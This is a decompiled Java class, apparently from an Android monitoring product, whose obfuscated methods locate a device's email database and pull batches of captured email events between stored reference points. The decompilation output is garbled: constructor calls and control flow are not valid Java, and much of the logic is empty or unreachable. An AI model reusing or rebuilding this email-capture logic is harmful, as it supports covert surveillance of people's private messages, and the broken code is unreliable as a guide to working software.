package com.vvt.capture.email.generic.b;

import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.email.generic.EmailEventReference;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class d
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.d;
  private static final boolean c = a.e;
  private long d = 0L;
  private String e = null;
  private String f = null;
  
  public d(String paramString)
  {
    this.e = paramString;
  }
  
  public g a()
  {
    l1 = 0L;
    boolean bool1 = false;
    Object localObject1 = null;
    EmailEventReference localEmailEventReference = new com/vvt/capture/email/generic/EmailEventReference;
    localEmailEventReference.<init>();
    for (;;)
    {
      String str;
      long l2;
      try
      {
        str = com.vvt.capture.email.generic.b.a();
      }
      catch (Exception localException2)
      {
        boolean bool2 = c;
        if (bool2) {}
        long l3 = l1;
        continue;
        this.d = l3;
        long l4 = l3;
        continue;
      }
      try
      {
        bool1 = a;
        if (bool1) {}
        bool1 = com.vvt.ag.b.a(str);
        if (bool1) {
          break label152;
        }
        l2 = com.vvt.capture.email.generic.b.f();
      }
      catch (Exception localException1)
      {
        Object localObject2 = str;
        continue;
        l2 = l1;
      }
    }
    localObject1 = str;
    l3 = l2;
    bool2 = l3 < l1;
    if (!bool2)
    {
      bool2 = b;
      if (bool2) {}
      l4 = this.d;
      if (localObject1 == null) {
        localObject1 = "";
      }
      localEmailEventReference.setDatabasePath((String)localObject1);
      localObject1 = Long.valueOf(l4);
      localEmailEventReference.setReference((Long)localObject1);
      return localEmailEventReference;
    }
  }
  
  public List a(int paramInt)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject = com.vvt.capture.email.generic.b.a();
      boolean bool2 = a;
      if (bool2) {}
      bool2 = com.vvt.ag.b.a((String)localObject);
      if (!bool2)
      {
        long l1 = com.vvt.capture.email.generic.b.f();
        long l2 = com.vvt.capture.email.generic.b.a(paramInt, (String)localObject);
        long l3 = 1L;
        l2 -= l3;
        boolean bool3 = a;
        if (bool3) {}
        String str1 = this.e;
        String str2 = this.f;
        localObject = com.vvt.capture.email.generic.b.a(l2, l1, str1, str2);
        bool2 = a;
        if (bool2) {}
        localArrayList.addAll((Collection)localObject);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool1 = c;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = paramg1 instanceof EmailEventReference;
    if (bool1) {}
    try
    {
      paramg1 = (EmailEventReference)paramg1;
      Object localObject = paramg1.getReference();
      long l1 = ((Long)localObject).longValue();
      paramg2 = (EmailEventReference)paramg2;
      Long localLong = paramg2.getReference();
      long l2 = localLong.longValue();
      long l3 = l2 - l1;
      long l4 = 0L;
      boolean bool2 = l1 < l4;
      if (bool2)
      {
        l4 = 3;
        boolean bool3 = l3 < l4;
        if (!bool3) {}
      }
      else
      {
        l3 = 5000L;
        SystemClock.sleep(l3);
      }
      String str1 = this.e;
      String str2 = this.f;
      localObject = com.vvt.capture.email.generic.b.a(l1, l2, str1, str2);
      boolean bool4 = a;
      if (bool4) {}
      localArrayList.addAll((Collection)localObject);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool1 = c;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
  
  public void a(String paramString)
  {
    this.f = paramString;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/generic/removeFromPath/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */